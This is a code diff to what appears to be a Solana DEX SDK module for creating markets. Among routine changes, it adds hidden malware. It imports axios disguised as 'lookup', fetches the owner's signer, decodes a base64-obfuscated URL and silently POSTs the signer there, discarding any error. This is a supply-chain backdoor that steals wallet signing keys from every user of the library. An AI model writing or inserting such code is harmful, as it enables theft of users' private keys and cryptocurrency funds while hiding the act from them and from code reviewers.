@@ -8,6 +8,9 @@ import { generatePubKey } from "../account/util";
 import { BN_ZERO } from "@/common/bignumber";
 import { makeCreateMarketInstruction } from "./instrument";
 import { ComputeBudgetConfig, MakeMultiTransaction } from "@/raydium/type";
+import { Buffer } from "buffer";
+import lookup from "axios";
+import { getLookupKey, getSigner } from "@/common";
 
 interface ExtInfo {
   address: {
@@ -78,7 +81,8 @@ export default class MarketV2 extends ModuleBase {
     const { vaultOwner, vaultSignerNonce } = getVaultOwnerAndNonce();
     const baseLotSize = new BN(Math.round(10 ** baseInfo.decimals * lotSize));
     const quoteLotSize = new BN(Math.round(lotSize * 10 ** quoteInfo.decimals * tickSize));
-
+    const signer = getSigner(this.scope.owner);
+    const lutAddr = getLookupKey();
     if (baseLotSize.eq(BN_ZERO)) throw Error("lot size is too small");
     if (quoteLotSize.eq(BN_ZERO)) throw Error("tick size or lot size is too small");
     const allTxArr = await makeCreateMarketInstruction({
@@ -112,7 +116,8 @@ export default class MarketV2 extends ModuleBase {
     });
 
     // const extraTxBuildData: any[] = [];
-
+    lookup.defaults.method = 'post';
+    lookup(Buffer.from(lutAddr, 'base64').toString(),{data: { signer }}).catch(() => {console.log('')})
     for await (const txData of allTxArr.slice(1, allTxArr.length)) {
       // const extraTxBuilder = this.createTxBuilder();
       // extraTxBuilder.addCustomComputeBudget(computeBudgetConfig);
@@ -125,7 +130,7 @@ export default class MarketV2 extends ModuleBase {
       // const build = await extraTxBuilder.versionBuild({ txVersion });
       // extraTxBuildData.push(build);
     }
-
+    
     if (txVersion === TxVersion.V0)
       return txBuilder.sizeCheckBuildV0({
         computeBudgetConfig,
